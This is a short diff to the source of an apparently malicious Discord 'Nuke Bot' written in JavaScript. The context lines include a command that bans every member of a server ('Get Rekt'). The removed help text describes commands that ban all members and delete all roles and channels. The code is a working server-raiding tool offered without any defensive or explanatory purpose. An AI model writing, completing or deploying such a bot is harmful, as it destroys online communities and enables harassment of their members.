@@ -24,15 +24,7 @@ if(msg.content.toLowerCase().startsWith("n!" + "delete")){
 if(msg.content.toLowerCase().startsWith("n!" + "ban")){
     msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Get Rekt"));
 }
-if(msg.content.toLowerCase().startsWith("n!" + "help")){
-    msg.author.send({
-        embed: {
-            color: 0xff0000,
-            author: { name: "Nuke Bot | n!help" },
-            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n Have Fun!"
-        }
-    })
-}
+    
 });
 
 nuke.login("token");
